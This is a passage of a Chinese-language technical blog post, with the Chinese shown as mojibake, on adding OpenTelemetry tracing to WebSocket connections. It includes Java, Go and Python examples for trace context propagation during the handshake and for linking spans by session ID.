<h4 data-id="heading-19">3.2.1 å¼•å…¥ OpenTelemetry API ä¾èµ–</h4>
<blockquote>
<p>æ¢é’ˆå¯¹ API çš„å…¼å®¹ä¸ºå‘å‰å…¼å®¹ï¼Œå¯¹äºæœ€æ–°ç‰ˆæœ¬çš„ API é€‚é…å¯èƒ½æ¯”è¾ƒæœ‰é™ï¼Œç”Ÿäº§ç¯å¢ƒä¸­ API åŒ…çš„ç‰ˆæœ¬ä¸éœ€è¦è¿‡æ–°ï¼ŒåŸºæœ¬ API è¶³å¤Ÿä½¿ç”¨å³å¯ã€‚</p>
</blockquote>
<p>å¯¹äº Java è¯­è¨€ï¼Œå»ºè®®åœ¨ pom.xml ä¸­å¼•å…¥ã€‚API æ–‡æ¡£ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fjavadoc.io%2Fdoc%2Fio.opentelemetry%2Fopentelemetry-api%2F1.28.0%2Findex.html" target="_blank" title="https://javadoc.io/doc/io.opentelemetry/opentelemetry-api/1.28.0/index.html" ref="nofollow noopener noreferrer">javadoc.io/doc/io.openâ€¦</a></p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
Â Â <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>io.opentelemetry<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
Â Â <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>opentelemetry-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<p>è·å–æ¢é’ˆæ³¨å…¥çš„å…¨å±€å®ä¾‹ï¼š</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">openTelemetry</span>Â = GlobalOpenTelemetry.get()<span class="hljs-comment">;</span>
<span class="hljs-attr">tracer</span>Â = openTelemetry.getTracer(<span class="hljs-string">"websocket-example"</span>,Â <span class="hljs-string">"1.0.0"</span>)<span class="hljs-comment">;</span>
</code></pre>
<p>å¯¹äº Golang è¯­è¨€ï¼Œå¯ä»¥æ‰§è¡Œ go get å‘½ä»¤è·å–åŒ…ã€‚API æ–‡æ¡£ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fpkg.go.dev%2Fgo.opentelemetry.io%2Fotel%40v1.28.0" target="_blank" title="https://pkg.go.dev/go.opentelemetry.io/otel@v1.28.0" ref="nofollow noopener noreferrer">pkg.go.dev/go.openteleâ€¦</a></p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">go</span>Â getÂ <span class="hljs-keyword">go</span>.opentelemetry.io/otel
</code></pre>
<p>è·å–æ¢é’ˆæ³¨å…¥çš„å…¨å±€å®ä¾‹ï¼š</p>
<pre><code class="hljs language-css" lang="css">tracer := otel.<span class="hljs-built_in">GetTracerProvider</span>().<span class="hljs-built_in">Tracer</span>(<span class="hljs-string">"websocket-example"</span>)
</code></pre>
<p>å¯¹äº Python è¯­è¨€ï¼Œå¯ä»¥é€šè¿‡ pip install è·å–ã€‚API æ–‡æ¡£ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fopentelemetry-python.readthedocs.io%2Fen%2Flatest%2F" target="_blank" title="https://opentelemetry-python.readthedocs.io/en/latest/" ref="nofollow noopener noreferrer">opentelemetry-python.readthedocs.io/en/latest/</a></p>
<pre><code class="hljs">pipÂ install opentelemetry-api
</code></pre>
<p>è·å–æ¢é’ˆæ³¨å…¥çš„å…¨å±€å®ä¾‹ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">fromÂ opentelemetryÂ importÂ trace
<span class="hljs-attr">tracer</span> = trace.get_tracer(__name__)
</code></pre>
<h4 data-id="heading-20">3.2.2 ä¼šè¯ç²’åº¦é—®é¢˜â€”â€”åˆ›å»º WebSocket è¿æ¥ç»´åº¦çš„ Trace</h4>
<p><strong>å®ç°å»ºè®®ï¼š</strong> WebSocket åœ¨å»ºç«‹è¿æ¥æ—¶ä¼šåŸºäº HTTP è¯·æ±‚å‘èµ·æ¡æ‰‹ï¼Œå¤ç”¨è¯¥ Trace ä¸Šä¸‹æ–‡ä½œä¸ºæ•´æ¬¡ WebSocket è¿æ¥ä¸­å­æ“ä½œçš„ä¸Šä¸‹æ–‡ã€‚</p>
<p>ä»¥ä¸‹æ˜¯ä»¥ä¸€æ•´ä¸ª WebSocket è¿æ¥ä¸ºä¸€æ¡ Trace çš„å®ç°åŸºæœ¬ç¤ºæ„å›¾ï¼Œæ‰€æœ‰çš„è¯·æ±‚ä¸æ•°æ®ä¼ é€’éƒ½ä½œä¸ºå­ Span æŒ‚é åœ¨ä¸€æ¡ Trace ä¸‹é¢ã€‚å› æ­¤ï¼Œè¿™ç§å®ç°æ›´é€‚åˆ WebSocket è¿æ¥æŒ‰éœ€è¿æ¥å¹¶ä¼šåŠæ—¶å…³é—­çš„åœºæ™¯ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1b2c8e553b85415ba9d994c662b7b407~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766394855&amp;x-signature=gfzt3GBvWKXkZm6YggkDJxQK0iY%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>Client ä¾§ä»£ç å®ç°ï¼ˆä»¥ Java åŸç”Ÿæä¾›çš„ WebSocket åº“ä¸ºä¾‹ï¼‰ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">public</span>Â <span class="hljs-keyword">static</span>Â <span class="hljs-built_in">void</span>Â <span class="hljs-title function_">main</span>(<span class="hljs-title class_">String</span>[] args) throwsÂ <span class="hljs-title class_">Exception</span>Â {
Â Â <span class="hljs-comment">// 1. åˆ›å»ºè¿æ¥çº§åˆ«çš„ Traceï¼ˆåœ¨è¿æ¥å‰åˆ›å»ºï¼Œä»¥ä¾¿åœ¨æ¡æ‰‹æ—¶ä¼ é€’ TraceContextï¼‰</span>
Â Â <span class="hljs-title class_">Span</span>Â connectionSpan = tracer.<span class="hljs-title function_">spanBuilder</span>(<span class="hljs-string">"websocket.connection"</span>)
Â  Â  Â  .<span class="hljs-title function_">setAttribute</span>(<span class="hljs-string">"websocket.endpoint"</span>,Â <span class="hljs-string">"/native/ws"</span>)
Â  Â  Â  .<span class="hljs-title function_">setAttribute</span>(<span class="hljs-string">"websocket.destination"</span>,Â <span class="hljs-string">"ws://localhost:18081"</span>)
Â  Â  Â  .<span class="hljs-title function_">setAttribute</span>(<span class="hljs-string">"websocket.connection.type"</span>,Â <span class="hljs-string">"client"</span>)
Â  Â  Â  .<span class="hljs-title function_">startSpan</span>();
Â Â <span class="hljs-comment">// 2. å°†å½“å‰ Span æ¿€æ´»åœ¨çº¿ç¨‹å†…çš„ä¸Šä¸‹æ–‡ä¸­ï¼Œæ ‡è®° Span çš„ä½œç”¨åŸŸä¸ºä»è¿æ¥å¼€å§‹åˆ°è¿æ¥å…³é—­</span>
Â Â <span class="hljs-keyword">try</span>Â (<span class="hljs-title class_">Scope</span>Â scope = connectionSpan.<span class="hljs-title function_">makeCurrent</span>()) {
Â  Â Â <span class="hljs-title class_">WebSocketContainer</span>Â container =Â <span class="hljs-title class_">ContainerProvider</span>.<span class="hljs-title function_">getWebSocketContainer</span>();
Â  Â Â <span class="hljs-comment">// åˆ›å»º WebSocket Client</span>
Â  Â Â <span class="hljs-title class_">NativeWebSocketClient</span>Â client =Â <span class="hljs-keyword">new</span>Â <span class="hljs-title class_">NativeWebSocketClient</span>();
Â  Â Â <span class="hljs-comment">// ä½¿ç”¨ Endpoint æ–¹å¼è¿æ¥</span>
Â  Â Â <span class="hljs-title class_">Session</span>Â session = container.<span class="hljs-title function_">connectToServer</span>(
Â  Â  Â  Â Â <span class="hljs-keyword">new</span>Â jakarta.<span class="hljs-property">websocket</span>.<span class="hljs-title class_">Endpoint</span>() {
Â  Â  Â  Â  Â Â <span class="hljs-meta">@Override</span>
Â  Â  Â  Â  Â Â <span class="hljs-keyword">public</span>Â <span class="hljs-built_in">void</span>Â <span class="hljs-title function_">onOpen</span>(<span class="hljs-params">SessionÂ session,Â EndpointConfigÂ config</span>) {
Â  Â  Â  Â  Â  Â  client.<span class="hljs-title function_">onOpen</span>(session);
Â  Â  Â  Â  Â  Â Â <span class="hljs-comment">// æ³¨å†Œæ¶ˆæ¯å¤„ç†å™¨ï¼ˆä½¿ç”¨åŒ¿åå†…éƒ¨ç±»è€Œä¸æ˜¯ lambdaï¼Œé¿å…æ³›å‹ç±»å‹æ¨æ–­é—®é¢˜ï¼‰</span>
Â  Â  Â  Â  Â  Â  session.<span class="hljs-title function_">addMessageHandler</span>(<span class="hljs-keyword">new</span>Â <span class="hljs-title class_">MessageHandler</span>.<span class="hljs-property">Whole</span>&lt;<span class="hljs-title class_">String</span>&gt;() {
Â  Â  Â  Â  Â  Â  Â Â <span class="hljs-meta">@Override</span>
Â  Â  Â  Â  Â  Â  Â Â <span class="hljs-keyword">public</span>Â <span class="hljs-built_in">void</span>Â <span class="hljs-title function_">onMessage</span>(<span class="hljs-params"><span class="hljs-built_in">String</span>Â message</span>) {
Â  Â  Â  Â  Â  Â  Â  Â  client.<span class="hljs-title function_">onMessage</span>(message);
Â  Â  Â  Â  Â  Â  Â  }
Â  Â  Â  Â  Â  Â  });
Â  Â  Â  Â  Â  }
Â  Â  Â  Â  Â Â <span class="hljs-meta">@Override</span>
Â  Â  Â  Â  Â Â <span class="hljs-keyword">public</span>Â <span class="hljs-built_in">void</span>Â <span class="hljs-title function_">onClose</span>(<span class="hljs-params">SessionÂ session,Â CloseReasonÂ closeReason</span>) {
Â  Â  Â  Â  Â  Â  client.<span class="hljs-title function_">onClose</span>();
Â  Â  Â  Â  Â  }
Â  Â  Â  Â  Â Â <span class="hljs-meta">@Override</span>
Â  Â  Â  Â  Â Â <span class="hljs-keyword">public</span>Â <span class="hljs-built_in">void</span>Â <span class="hljs-title function_">onError</span>(<span class="hljs-params">SessionÂ session,Â ThrowableÂ thr</span>) {
Â  Â  Â  Â  Â  Â Â <span class="hljs-comment">// è®°å½•é”™è¯¯åˆ°å½“å‰ Span</span>
Â  Â  Â  Â  Â  Â  connectionSpan.<span class="hljs-title function_">recordException</span>(thr);
Â  Â  Â  Â  Â  Â  client.<span class="hljs-title function_">onError</span>(thr);
Â  Â  Â  Â  Â  }
Â  Â  Â  Â  },
Â  Â  Â  Â Â <span class="hljs-comment">// 3. å‘èµ·æ¡æ‰‹æ—¶ï¼Œåœ¨è¯·æ±‚å¤´ä¸­æºå¸¦å½“å‰çš„ä¸Šä¸‹æ–‡</span>
Â  Â  Â  Â Â <span class="hljs-title function_">createHeaderWithUserProperties</span>(),
Â  Â  Â  Â Â <span class="hljs-variable constant_">URI</span>.<span class="hljs-title function_">create</span>(<span class="hljs-string">"ws://localhost:18081/native/ws"</span>));
Â  Â  client.<span class="hljs-property">session</span>Â = session;
Â  Â  client.<span class="hljs-property">sessionId</span>Â = session.<span class="hljs-title function_">getId</span>();
Â  Â  log.<span class="hljs-title function_">info</span>(<span class="hljs-string">"å®¢æˆ·ç«¯å·²å¯åŠ¨ï¼Œè¾“å…¥æ¶ˆæ¯å‘é€ç»™æœåŠ¡å™¨ï¼ˆè¾“å…¥ 'exit' é€€å‡ºï¼‰:"</span>);
Â  Â Â <span class="hljs-comment">// ä»æ§åˆ¶å°è¯»å–è¾“å…¥</span>
Â  Â Â <span class="hljs-title class_">BufferedReader</span>Â reader =Â <span class="hljs-keyword">new</span>Â <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span>Â <span class="hljs-title class_">InputStreamReader</span>(<span class="hljs-title class_">System</span>.<span class="hljs-property">in</span>));
Â  Â Â <span class="hljs-title class_">String</span>Â line;
Â  Â Â <span class="hljs-keyword">while</span>Â ((line = reader.<span class="hljs-title function_">readLine</span>()) !=Â <span class="hljs-literal">null</span>Â &amp;&amp; !line.<span class="hljs-title function_">equals</span>(<span class="hljs-string">"exit"</span>)) {
Â  Â  Â Â <span class="hljs-keyword">if</span>Â (!line.<span class="hljs-title function_">trim</span>().<span class="hljs-title function_">isEmpty</span>()) {
Â  Â  Â  Â Â <span class="hljs-comment">// 4. å‘ Server å‘é€æ¶ˆæ¯</span>
Â  Â  Â  Â  client.<span class="hljs-title function_">sendMessage</span>(line);
Â  Â  Â  }
Â  Â  }
Â  Â Â <span class="hljs-comment">// å…³é—­è¿æ¥</span>
Â  Â  client.<span class="hljs-title function_">close</span>();
Â  Â  log.<span class="hljs-title function_">info</span>(<span class="hljs-string">"å®¢æˆ·ç«¯å·²é€€å‡º"</span>);
Â  }Â <span class="hljs-keyword">catch</span>Â (<span class="hljs-title class_">Exception</span>Â e) {
Â  Â Â <span class="hljs-comment">// å¦‚æœå‡ºç°é”™è¯¯ï¼Œè®°å½•åˆ° span ä¸­</span>
Â  Â  connectionSpan.<span class="hljs-title function_">recordException</span>(e);
Â  Â  log.<span class="hljs-title function_">error</span>(<span class="hljs-string">"å®¢æˆ·ç«¯å¯åŠ¨å¤±è´¥"</span>, e);
Â  }Â <span class="hljs-keyword">finally</span>Â {
Â  Â Â <span class="hljs-comment">// 5. ç»“æŸ span</span>
Â  Â  connectionSpan.<span class="hljs-title function_">end</span>();
Â  }
Â Â <span class="hljs-comment">// ç­‰å¾… span å¼‚æ­¥ä¸ŠæŠ¥ï¼Œå®é™…ä¸šåŠ¡ä¸­æ— éœ€ä¿ç•™</span>
Â Â <span class="hljs-title class_">Thread</span>.<span class="hljs-title function_">sleep</span>(5000L);
}
<span class="hljs-keyword">private</span>Â <span class="hljs-keyword">static</span>Â <span class="hljs-title class_">ClientEndpointConfig</span>Â <span class="hljs-title function_">createHeaderWithUserProperties</span>(<span class="hljs-params"/>) {
Â Â <span class="hljs-comment">// åˆ›å»º ClientEndpointConfigï¼Œç”¨äºè‡ªå®šä¹‰æ¡æ‰‹è¯·æ±‚å¤´</span>
Â Â <span class="hljs-title class_">ClientEndpointConfig</span>.<span class="hljs-property">Builder</span>Â configBuilder =Â <span class="hljs-title class_">ClientEndpointConfig</span>.<span class="hljs-property">Builder</span>.<span class="hljs-title function_">create</span>();
Â Â <span class="hljs-comment">// 3.1. è·å–å½“å‰çš„ TraceContextï¼Œå‡†å¤‡ HTTP headers</span>
Â  finalÂ <span class="hljs-title class_">Map</span>&lt;<span class="hljs-title class_">String</span>,Â <span class="hljs-title class_">List</span>&lt;<span class="hljs-title class_">String</span>&gt;&gt; headersMap =Â <span class="hljs-keyword">new</span>Â <span class="hljs-title class_">HashMap</span>&lt;&gt;();
Â Â <span class="hljs-title class_">Context</span>Â currentContext =Â <span class="hljs-title class_">Context</span>.<span class="hljs-title function_">current</span>();
Â Â <span class="hljs-comment">// 3.2. é€šè¿‡å…¨å±€å®ä¾‹çš„ ContextPropagators æ³¨å…¥ TraceContext åˆ° headers</span>
Â  openTelemetry.<span class="hljs-title function_">getPropagators</span>().<span class="hljs-title function_">getTextMapPropagator</span>()
Â  Â  Â  .<span class="hljs-title function_">inject</span>(currentContext, headersMap, (carrier, key, value) -&gt; carrier.<span class="hljs-title function_">put</span>(key,Â <span class="hljs-title class_">List</span>.<span class="hljs-title function_">of</span>(value)));
Â Â <span class="hljs-comment">// 3.3. è®¾ç½® Configurator æ¥åœ¨æ¡æ‰‹æ—¶æ·»åŠ  headers</span>
Â  configBuilder.<span class="hljs-title function_">configurator</span>(<span class="hljs-keyword">new</span>Â <span class="hljs-title class_">ClientEndpointConfig</span>.<span class="hljs-title class_">Configurator</span>() {
Â  Â Â <span class="hljs-meta">@Override</span>
Â  Â Â <span class="hljs-keyword">public</span>Â <span class="hljs-built_in">void</span>Â <span class="hljs-title function_">beforeRequest</span>(<span class="hljs-params"><span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">String</span>,Â List&lt;<span class="hljs-built_in">String</span>&gt;&gt; headers</span>) {
Â  Â  Â  headers.<span class="hljs-title function_">putAll</span>(headersMap);
Â  Â  }
Â  });
Â Â <span class="hljs-keyword">return</span>Â configBuilder.<span class="hljs-title function_">build</span>();
}
</code></pre>
<p>Server ä¾§ä»£ç å®ç°ï¼ˆä»¥ Java åŸç”Ÿæä¾›çš„ WebSocket åº“ä¸ºä¾‹ï¼‰ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@ServerEndpoint</span>(value =Â <span class="hljs-string">"/native/ws"</span>, configurator =Â <span class="hljs-title class_">NativeWebSocketServer</span>.<span class="hljs-property">TraceContextConfigurator</span>.<span class="hljs-property">class</span>)
<span class="hljs-keyword">public</span>Â <span class="hljs-keyword">class</span>Â <span class="hljs-title class_">NativeWebSocketServer</span>Â {
Â Â <span class="hljs-comment">// æŒ‰ç…§ session ç»´åº¦ç®¡ç†æ¥è‡ª Client çš„ä¸Šä¸‹æ–‡</span>
Â Â <span class="hljs-keyword">private</span>Â <span class="hljs-keyword">static</span>Â finalÂ <span class="hljs-title class_">Map</span>&lt;<span class="hljs-title class_">String</span>,Â <span class="hljs-title class_">Context</span>&gt; connectionTraceContexts =Â <span class="hljs-keyword">new</span>Â <span class="hljs-title class_">ConcurrentHashMap</span>&lt;&gt;();
Â Â <span class="hljs-comment">// 1. å®šä¹‰é…ç½®ç±»ï¼Œç”¨äºåœ¨æ¡æ‰‹æ—¶æå– TraceContext</span>
Â Â <span class="hljs-keyword">public</span>Â <span class="hljs-keyword">static</span>Â <span class="hljs-keyword">class</span>Â <span class="hljs-title class_">TraceContextConfigurator</span>Â <span class="hljs-keyword">extends</span>Â <span class="hljs-title class_ inherited__">ServerEndpointConfig.Configurator</span>Â {
Â  Â Â <span class="hljs-keyword">private</span>Â <span class="hljs-keyword">static</span>Â finalÂ <span class="hljs-title class_">TextMapGetter</span>&lt;<span class="hljs-title class_">Map</span>&lt;<span class="hljs-title class_">String</span>,Â <span class="hljs-title class_">List</span>&lt;<span class="hljs-title class_">String</span>&gt;&gt;&gt; headerGetter =Â <span class="hljs-keyword">new</span>Â <span class="hljs-title class_">TextMapGetter</span>&lt;<span class="hljs-title class_">Map</span>&lt;<span class="hljs-title class_">String</span>,Â <span class="hljs-title class_">List</span>&lt;<span class="hljs-title class_">String</span>&gt;&gt;&gt;() {
Â  Â  Â Â <span class="hljs-meta">@Override</span>
Â  Â  Â Â <span class="hljs-keyword">public</span>Â <span class="hljs-title class_">Iterable</span>&lt;<span class="hljs-title class_">String</span>&gt;Â <span class="hljs-title function_">keys</span>(<span class="hljs-params"><span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">String</span>,Â List&lt;<span class="hljs-built_in">String</span>&gt;&gt; carrier</span>) {
Â  Â  Â  Â Â <span class="hljs-keyword">return</span>Â carrier.<span class="hljs-title function_">keySet</span>();
Â  Â  Â  }
Â  Â  Â Â <span class="hljs-meta">@Override</span>
Â  Â  Â Â <span class="hljs-keyword">public</span>Â <span class="hljs-title class_">String</span>Â <span class="hljs-title function_">get</span>(<span class="hljs-params"><span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">String</span>,Â List&lt;<span class="hljs-built_in">String</span>&gt;&gt; carrier,Â <span class="hljs-built_in">String</span>Â key</span>) {
Â  Â  Â  Â Â <span class="hljs-title class_">List</span>&lt;<span class="hljs-title class_">String</span>&gt; values = carrier.<span class="hljs-title function_">get</span>(key);
Â  Â  Â  Â Â <span class="hljs-keyword">return</span>Â values !=Â <span class="hljs-literal">null</span>Â &amp;&amp; !values.<span class="hljs-title function_">isEmpty</span>() ? values.<span class="hljs-title function_">get</span>(<span class="hljs-number">0</span>) :Â <span class="hljs-literal">null</span>;
Â  Â  Â  }
Â  Â  };
Â  Â Â <span class="hljs-meta">@Override</span>
Â  Â Â <span class="hljs-keyword">public</span>Â <span class="hljs-built_in">void</span>Â <span class="hljs-title function_">modifyHandshake</span>(<span class="hljs-params">ServerEndpointConfigÂ sec,Â HandshakeRequestÂ request,Â HandshakeResponseÂ response</span>) {
Â  Â  Â Â <span class="hljs-comment">// ä» HTTP headers ä¸­æå– TraceContext</span>
Â  Â  Â Â <span class="hljs-title class_">Map</span>&lt;<span class="hljs-title class_">String</span>,Â <span class="hljs-title class_">List</span>&lt;<span class="hljs-title class_">String</span>&gt;&gt; headers = request.<span class="hljs-title function_">getHeaders</span>();
Â  Â  Â Â <span class="hljs-title class_">Context</span>Â extractedContext = openTelemetry.<span class="hljs-title function_">getPropagators</span>()
Â  Â  Â  Â  Â  .<span class="hljs-title function_">getTextMapPropagator</span>()
Â  Â  Â  Â  Â  .<span class="hljs-title function_">extract</span>(<span class="hljs-title class_">Context</span>.<span class="hljs-title function_">current</span>(), headers, headerGetter);
Â  Â  Â Â <span class="hljs-comment">// 2. å°† TraceContext å­˜å‚¨åˆ° userPropertiesï¼Œåœ¨ onOpen æ—¶æå–</span>
Â  Â  Â  sec.<span class="hljs-title function_">getUserProperties</span>().<span class="hljs-title function_">put</span>(<span class="hljs-string">"traceContext"</span>, extractedContext);
Â  Â  }
Â  }
Â Â <span class="hljs-meta">@OnOpen</span>
Â Â <span class="hljs-keyword">public</span>Â <span class="hljs-built_in">void</span>Â <span class="hljs-title function_">onOpen</span>(<span class="hljs-params">SessionÂ session,Â EndpointConfigÂ config</span>) {
Â  Â Â <span class="hljs-title class_">String</span>Â sessionId = session.<span class="hljs-title function_">getId</span>();
Â  Â  sessions.<span class="hljs-title function_">put</span>(sessionId, session);
Â  Â Â <span class="hljs-comment">// 3. ä» config çš„ userProperties ä¸­æå– TraceContextï¼ˆåœ¨ Configurator ä¸­è®¾ç½®ï¼‰</span>
Â  Â Â <span class="hljs-title class_">Context</span>Â parentContext =Â <span class="hljs-title class_">Context</span>.<span class="hljs-title function_">current</span>();
Â  Â Â <span class="hljs-title class_">Object</span>Â traceContextObj = config.<span class="hljs-title function_">getUserProperties</span>().<span class="hljs-title function_">get</span>(<span class="hljs-string">"traceContext"</span>);
Â  Â Â <span class="hljs-keyword">if</span>Â (traceContextObjÂ <span class="hljs-keyword">instanceof</span>Â <span class="hljs-title class_">Context</span>) {
Â  Â  Â  Â  parentContext = (<span class="hljs-title class_">Context</span>) traceContextObj;
Â  Â  }
Â  Â Â <span class="hljs-comment">// 4. å°† Client é“¾è·¯ä¸Šä¸‹æ–‡ä¿å­˜ä¸‹æ¥ï¼Œåœ¨éœ€è¦åˆ›å»ºå­ span æ—¶è·å–å³å¯</span>
Â  Â  connectionTraceContexts.<span class="hljs-title function_">put</span>(sessionId, parentContext);
Â  Â  log.<span class="hljs-title function_">info</span>(<span class="hljs-string">"å®¢æˆ·ç«¯è¿æ¥: sessionId={}, å½“å‰è¿æ¥æ•°={}, å·²ä» Client TraceContext åˆ›å»ºå­ Span"</span>, sessionId, sessions.<span class="hljs-title function_">size</span>());
Â  Â Â <span class="hljs-title function_">sendMessage</span>(session,Â <span class="hljs-string">"æ¬¢è¿è¿æ¥ï¼æ‚¨çš„ä¼šè¯ID: "</span>Â + sessionId);
Â  }
Â Â <span class="hljs-meta">@OnClose</span>
Â Â <span class="hljs-keyword">public</span>Â <span class="hljs-built_in">void</span>Â <span class="hljs-title function_">onClose</span>(<span class="hljs-params">SessionÂ session</span>) {
Â  Â Â <span class="hljs-title class_">String</span>Â sessionId = session.<span class="hljs-title function_">getId</span>();
Â  Â  sessions.<span class="hljs-title function_">remove</span>(sessionId);
Â  Â  connectionTraceContexts.<span class="hljs-title function_">remove</span>(sessionId);
Â  Â  log.<span class="hljs-title function_">info</span>(<span class="hljs-string">"å®¢æˆ·ç«¯æ–­å¼€: sessionId={}, å‰©ä½™è¿æ¥æ•°={}, Traceå·²ç»“æŸ"</span>, sessionId, sessions.<span class="hljs-title function_">size</span>());
Â  }
}
</code></pre>
<h4 data-id="heading-21">3.2.3 ä¼šè¯ç²’åº¦é—®é¢˜â€”â€”ä½¿ç”¨ä¼šè¯ ID å…³è”ä¸åŒçš„ Trace</h4>
<p><strong>å®ç°å»ºè®®ï¼š</strong> å¤ç”¨ WebSocket çš„ Session ID ä½œä¸ºæ¯æ¡ Span çš„å±æ€§ï¼Œåœ¨å¿…è¦æ—¶ä¹Ÿå¯ä»¥æŒ‰ç…§å±æ€§æŸ¥è¯¢æ¥è‡ªäºåŒä¸€ä¸ª WebSocket ä¼šè¯çš„æ‰€æœ‰ Traceã€‚</p>
<p>ä»¥ä¸‹æ˜¯ä½¿ç”¨ä¼šè¯ ID å…³è”ä¸åŒ Trace çš„å®ç°åŸºæœ¬ç¤ºæ„å›¾ï¼Œæ¯æ¬¡ Client ä¾§æˆ– Server ä¾§å‘èµ·çš„ä¸»åŠ¨è¯·æ±‚éƒ½æ˜¯ä¸€æ¡å•ç‹¬çš„ Traceï¼Œå½¼æ­¤ä¹‹é—´å¹¶ä¸ä¼šåœ¨ Trace ç€‘å¸ƒå›¾ä¸­å‘ˆç°å…³ç³»ï¼Œä½†å¯ä»¥é€šè¿‡ä¼šè¯ ID è¿™ä¸ªå±æ€§è¿›è¡Œè¿‡æ»¤å’ŒæŸ¥è¯¢ã€‚å› æ­¤ï¼Œè¿™ç§å®ç°æ›´é€‚åˆ WebSocket è¿æ¥æ—¶é—´å¾ˆé•¿ï¼Œä¸”å¯èƒ½å­˜åœ¨å¤ç”¨çš„åœºæ™¯ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8f0e6fa947114ba0b17c1972832d2087~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766394855&amp;x-signature=MX%2B%2BPHdbiF7dDs1s%2BrjjX1sswGs%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>ä½¿ç”¨ä¼šè¯ ID å…³è”ä¸åŒ Trace å®ç°æ–¹æ¡ˆç›¸å¯¹ç®€å•ï¼Œå¤§å¤šæ•°æ¡†æ¶éƒ½èƒ½ç›´æ¥è·å–åˆ°å½“å‰æ‰€åœ¨ä¼šè¯çš„ IDï¼Œè°ƒç”¨ setAttribute API å†™å…¥ Span å³å¯ï¼Œä»¥ä¸‹æ˜¯ä¸€ä¸ªåŸºæœ¬ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span>Â <span class="hljs-keyword">void</span>Â <span class="hljs-title function_">sendMessage</span><span class="hljs-params">(Session session, String message)</span>Â {
Â Â <span class="hljs-type">Span</span>Â <span class="hljs-variable">span</span>Â <span class="hljs-operator">=</span>Â tracer.spanBuilder(<span class="hljs-string">"Client send message"</span>).startSpan();
Â Â <span class="hljs-comment">// å‘ span ä¸­å†™å…¥ session id</span>
Â  span.setAttribute(<span class="hljs-string">"websocket.session.id"</span>, session.getId());
Â Â <span class="hljs-keyword">try</span>Â (<span class="hljs-type">Scope</span>Â <span class="hljs-variable">scope</span>Â <span class="hljs-operator">=</span>Â span.makeCurrent()) {
Â  Â  doSendMessage(message);
Â  }Â <span class="hljs-keyword">finally</span>Â {
Â  Â  span.end();
Â  }
}
</code></pre>
<h4 data-id="heading-22">3.2.4 è°ƒç”¨å»ºæ¨¡é—®é¢˜â€”â€”å­˜åœ¨æ˜æ˜¾è°ƒç”¨å…³ç³»</h4>
<p><strong>å®ç°å»ºè®®ï¼š</strong> ä»¿ç…§ Messaging ç³»ç»Ÿçš„é“¾è·¯è¿½è¸ªé€»è¾‘ï¼Œæ¶ˆæ¯çš„å‘é€è€…ä¸ºè°ƒç”¨æ–¹ï¼Œæ¶ˆæ¯çš„æ¥å—è€…ä¸ºè¢«è°ƒç”¨æ–¹ï¼Œåˆ†åˆ«åˆ›å»º Spanã€‚è°ƒç”¨æ–¹ Span ä½œä¸ºè¢«è°ƒç”¨æ–¹çš„çˆ¶çº§ã€‚æ¶‰åŠå¤šè½®æ¶ˆæ¯å‘é€ï¼Œåªè¦æ„å›¾ä¸ºæµå¼ä¼ è¾“ï¼Œè§†ä¸ºä¸€æ¬¡è°ƒç”¨è¡Œä¸ºã€‚</p>
<p>é“¾è·¯æ•ˆæœå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/77e68f788b7c4c6eafcb0381b57bf7ed~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766394855&amp;x-signature=Sg%2FCnw1eoFQivh9Ang3gFXDeME8%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
